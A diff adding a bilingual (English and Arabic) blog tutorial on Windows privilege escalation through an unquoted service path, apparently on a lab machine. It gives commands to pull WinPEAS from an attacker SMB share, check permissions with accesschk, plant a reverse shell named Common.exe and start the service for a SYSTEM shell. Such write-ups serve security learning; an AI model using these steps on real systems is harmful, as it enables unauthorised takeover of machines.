@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Windows Privilege Escalation - Unquoted Service Path | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">windows-privesc</a><span class="sep">/</span><span>Windows Privilege Escalation - Unquoted Service Path</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">windows-privesc</span>
+<span class="post-date">2023-05-15</span>
+</div>
+<h1 class="post-title">Windows Privilege Escalation - Unquoted Service Path</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will explain how to escalate privileges by exploiting an Unquoted Service Path. Before we begin the practical demonstration, we need to understand a few important concepts so that everything we do during exploitation is clear.</p>
+<h3>What is an Unquoted Service Path?</h3>
+<p>Some Windows services have executable paths that contain spaces. When these paths are not enclosed in quotation marks (<code>" "</code>), Windows handles them differently. Let us look at an example to see exactly how Windows treats them.</p>
+<p>Suppose we have the following service path:</p>
+<pre><code>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+</code></pre>
+<p>When the service runs, Windows will traverse the path folder by folder, attempting to execute each folder name as an <code>.exe</code> file. Specifically, it will try the following paths in order:</p>
+<ol>
+<li><code>C:\Program.exe</code></li>
+<li><code>C:\Program Files\Unquoted.exe</code></li>
+<li><code>C:\Program Files\Unquoted Path Service\Common.exe</code></li>
+<li><code>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</code></li>
+</ol>
+<p>Windows keeps trying each path until it finds a valid executable and runs it. Our goal is to check each folder leading up to the service executable (<code>unquotedpathservice.exe</code>) to see if any of them have write permissions. If we find a writable folder, we place our reverse shell there, named to match the next folder in the path, so that Windows executes it before reaching the legitimate service executable.</p>
+<h2>Walkthrough</h2>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/1.jpeg" alt="Step 1" loading="lazy"></figure>
+<h3>Step 1: Confirm Low-Privilege Access</h3>
+<p>As usual, we are logged in as a limited user with the goal of escalating to the highest privileges on the system.</p>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/10.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 2: Transfer and Run WinPEAS</h3>
+<p>Next, we use the WinPEAS tool. This tool is well-known and needs no introduction -- it enumerates the system to find potential privilege escalation vectors through services and other misconfigurations.</p>
+<p>First, we transfer the script to the compromised system. You can do this via an SMB server or an HTTP server. In this case, we use an SMB server with a Python tool that you can download from GitHub:</p>
+<p><a href="https://github.com/SecureAuthCorp/impacket">SMB Server - GitHub</a></p>
+<p>After downloading the tool, it requires two inputs:</p>
+<ul>
+<li><strong>shareName</strong>: you can use any folder name you choose</li>
+<li><strong>sharePath</strong>: the path to the folder containing the script you want to transfer to the compromised system</li>
+</ul>
+<p>After setting up the SMB server, run the following command on the compromised system to download the WinPEAS script (replace the IP with your Kali machine's IP):</p>
+<pre><code>copy \\&lt;attacker_ip&gt;\&lt;shareName&gt;\winPEASx64.exe C:\PrivEsc\winPEASx64.exe
+</code></pre>
+<p>Then run the script:</p>
+<pre><code>C:\PrivEsc\winPEASx64.exe
+</code></pre>
+<p>We can see that the script reports a service with an unquoted path.</p>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/2.png" alt="Step 3" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/3.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 3: Verify Start/Stop Permissions</h3>
+<p>Before we begin exploitation, we need to verify an important prerequisite: do we have permission to start and stop the service? If we cannot start or stop the service, we cannot exploit it.</p>
+<p>First, query the service status:</p>
+<pre><code>sc query unquotedsvc
+</code></pre>
+<p>Then, use the accesschk tool to check whether we can start and stop the service. You can download accesschk from the Sysinternals suite:</p>
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk - Sysinternals</a></p>
+<p>Upload accesschk to the compromised system and run the following command:</p>
+<pre><code>accesschk.exe /accepteula -ucqv unquotedsvc
+</code></pre>
+<p>We can see that we have permission to start and stop the service.</p>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/4.png" alt="Step 5" loading="lazy"></figure>
+<h3>Step 4: Check Write Permissions on Path Folders</h3>
+<p>Now we check each folder in the service path to determine which ones we have write permissions on. The service path is:</p>
+<pre><code>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+</code></pre>
+<p>We use the following command to check permissions on each folder:</p>
+<pre><code>accesschk.exe /accepteula -uwdq &quot;C:\&quot;
+</code></pre>
+<p>We can see that we do not have write or read permissions on the <code>C:\</code> directory.</p>
+<p>Let us check the next folder:</p>
+<pre><code>accesschk.exe /accepteula -uwdq &quot;C:\Program Files\Unquoted Path Service\&quot;
+</code></pre>
+<p>We can see that the <code>Unquoted Path Service</code> folder grants us write and read permissions. This is the folder we will use.</p>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/5.png" alt="Step 6" loading="lazy"></figure>
+<h3>Step 5: Place the Reverse Shell</h3>
+<p>Since we have write access to the <code>Unquoted Path Service</code> directory, and the next folder in the path is <code>Common Files</code>, we name our reverse shell <code>Common.exe</code> and place it in the writable directory:</p>
+<pre><code>copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;
+</code></pre>
+<p>When Windows tries to resolve the unquoted path, it will find <code>Common.exe</code> in this directory and execute it before ever reaching the legitimate <code>unquotedpathservice.exe</code>.</p>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/6.png" alt="Step 7" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/7.png" alt="Step 8" loading="lazy"></figure>
+<h3>Step 6: Set Up a Listener</h3>
+<p>Set up a netcat listener on the port specified in your reverse shell payload:</p>
+<pre><code class="language-bash">nc -lvp &lt;port&gt;
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/8.png" alt="Step 9" loading="lazy"></figure>
+<h3>Step 7: Start the Service</h3>
+<p>All that remains is to start the service. Windows will follow the path resolution order we described earlier and execute our reverse shell:</p>
+<pre><code>net start unquotedsvc
+</code></pre>
+<h2>Result</h2>
+<p>After starting the service, we receive a reverse shell connection with the highest privileges on the system. We have successfully escalated our privileges through an Unquoted Service Path.</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/9.png" alt="Step 10" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>Windows Privilege Escalaction (Unquoted Service Path)</p>
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نشرح كيف ممكن ترفع صلاحيتك عن طريق Unquoted Service Path بس قبل نبدا في التطبيق لازم نفهم كذا نقطة مهمة عشان وقت الاستغلال يكون واضح لك كل شي قاعد نسويه</p>
+<p>اولا خلونا نعرف ايش تعني Unquoted Service Path بعض السيرفس المسارات حقتها تحتوي على مسافات ف نظام الوندوز راح يعاملها معاملة اخرى اذا ماكانت تحتوي على علامات تنصيص " " كيف يعني ! راح اعطي مثال ونشوف كيف انه راح يعاملها معاملة اخرى</p>
+<p>نفترض عندنا هذا المسار:</p>
+<p>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</p>
+<p>ف اذا صار رن للسيرفس ايش راح يسوي وندوز بالضبط راح يروح لمجلد ورا مجلد ويجرب ينفذ الاسم تبع المجلد على انه ملف exe ف اول شي راح يروح لمسار</p>
+<p>C:\Program.exe</p>
+<p>بعد كذا اذا مالقى انه exe راح يروح للمجلد اللي بعدة وينفذه على انه ملف exe</p>
+<p>C:\Program Files\Unquoted.exe</p>
+<p>وهكذا الى ان يوصل الى ملف ال exe حق السيرفس وينفذه طيب نحن هدفنا انه نشوف كل مجلد ورا ملف السيرفس اللي هو unquotedpathservice.exe هل في مجلد وراه يحتوي على صلاحية كتابة عشان راح نحط ملف الريفيرس شيل بنفس اسم المجلد عشان يتنفذ قبل يوصل الى ملف السيرفس وينفذه اتمنى وضحت الفكرة يلا ننتقل للعملي</p>
+<p>الشرح:</p>
+<p>كالعادة انا انا داخل بيوزر محدود الصلاحية والهدف انه نوصل الى اعلى صلاحية على النظام</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/1.jpeg" alt="Step 1" loading="lazy"></figure>
+
+<p>بعد كذا راح استخدم اداة winpease هذي الاداة غنية عن التعريف راح تسوي enumerate للنظام بحيث تشوف هل في امكانية انه نرفع صلاحيتنا عن طريق services وغيرة</p>
+<p>WinPease</p>
+<p>اول شي راح تنقل السكربت الى النظام المخترق عن طريق smb server او عن طريق ال http انا راح انقلة عن طريق smb server ف راح استخدم اداة بالبايثون ممكن انه تنزلها من قيت اب</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/10.png" alt="Step 2" loading="lazy"></figure>
+
+<p>هذي الاداة على موقع قيت اب:</p>
+<p>Smb Server</p>
+<p>طبعا بعد تنزل الملف السكربت راح يطلب منك مدخلين اللي هم</p>
+<p>shareName sharePath</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/2.png" alt="Step 3" loading="lazy"></figure>
+
+<p>الشير نيم تقدر تحط اي اسم مجلد من مخليتك</p>
+<p>الشير باث راح تحط مسار المجلد اللي يحتوي على السكربت اللي راح تنقلة للنظام المخترق</p>
+<p>ف راح يكون الأمر كالتالي بالنسبة لي:</p>
+<p>بعد كذا راح نروح نكتب هذا الأمر على النظام اللي مخترقينة بحيث يتحمل سكربت winpease على النظام</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/3.png" alt="Step 4" loading="lazy"></figure>
+
+<p>طبعا الايبي اللي انا حاطة بالأمر الايبي تبع الكالي حقي عشان محد يتلخبط</p>
+<p>بعد كذا راح نشغل السكربت</p>
+<p>نلاحظ انه السكربت يقولنا السيرفس هذي لا تحتوي على علامات تنصيص بس قبل نبدا ف الاستغلال راح نتاكد من شي مهم اللي هل عندنا صلاحية انه نقدر نسوي start او stop للسيرفس لان لو مانقدر نسوي start او stop للسيرفس ماينفع نستغلها</p>
+<p>عن طريق هذا الامر راح نعرف :</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/4.png" alt="Step 5" loading="lazy"></figure>
+
+<p>sc query unquotedsvc</p>
+<p>طيب راح استخدم اداة accesschk عشان اعرف هل عندي امكانية انه اسوي start او stop للسيرفس او لا</p>
+<p>هذا الرابط اللي وده يحملها :</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/5.png" alt="Step 6" loading="lazy"></figure>
+
+<p>accesschk</p>
+<p>طيب خلونا نكمل راح ارفع الملف على النظام المخترق وراح انفذ هذ الأمر:</p>
+<p>نلاحظ انه عندنا صلاحية انه نسوي start او stop للسيرفس</p>
+<p>اللحين راح نشوف كل مجلد ورا السيرفس هل عندنا عليه صلاحية كتابة او قراءة</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/6.png" alt="Step 7" loading="lazy"></figure>
+
+<p>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</p>
+<p>عن طريق هذا الامر:</p>
+<p>accesschk.exe /accepteula -uwdq FolderPath</p>
+<p>نلاحظ انه ماعندنا صلاحية كتابة او قراءة على مجلد ال C</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/7.png" alt="Step 8" loading="lazy"></figure>
+
+<p>نروح نشوف المجلد اللي بعده اللي هو Unquoted Path Service</p>
+<p>نلاحظ انه المجلد Unquoted Path Service عندنا صلاحية كتابة وقراءة عليه</p>
+<p>اللحين فقط راح نسمي الريفيرس شيل حقنا على نفس اسم الملجد القادم اللي هو Common.exe</p>
+<p>اللحين راح اتنصت على البورت اللي انا حاطه في الريفيرس شيل عن طريق النت كات</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/8.png" alt="Step 9" loading="lazy"></figure>
+
+<p>بعد كذا اللي باقي لنا انه نسوي ستارت للسيرفس وراح يمشي على النهج اللي شرحته بداية المقالة ويشغل الريفيرس شل حقنا</p>
+<p>امر تشغيل السيرفس:</p>
+<p>net start unquotedsvc</p>
+<figure class="article-img"><img src="../assets/images/unquoted-service-path/9.png" alt="Step 10" loading="lazy"></figure>
+
+<p>وبكذا حلصنا على اعلى صلاحية على النظام عن طريق Unquoted Service Path</p>
+<p>شاكر لكم .</p>
+<p>كلمات دليلية: hacking privilege</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
